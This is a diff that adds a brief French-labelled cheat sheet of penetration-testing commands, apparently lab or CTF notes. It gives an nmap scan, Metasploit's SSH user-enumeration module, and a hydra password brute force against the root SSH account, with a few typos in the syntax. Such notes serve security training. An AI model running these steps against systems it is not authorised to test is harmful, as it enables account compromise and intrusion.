@@ -1,0 +1,16 @@
+commande :
+
+nmap:
+======> nmap-sS -sC-sV "ip"
+
+
+msfconsole :
+======> search ssh
+======> auxiliary/scanner*/ssh/ssh_enumusers
+======> show options 
+======> set RHOSTS
+======> set USER_FILE /root/users.txt
+======> exploit
+
+hydra:
+======> hydra -l root -P /root/wordlist.txt "IP"  ssh -v -V
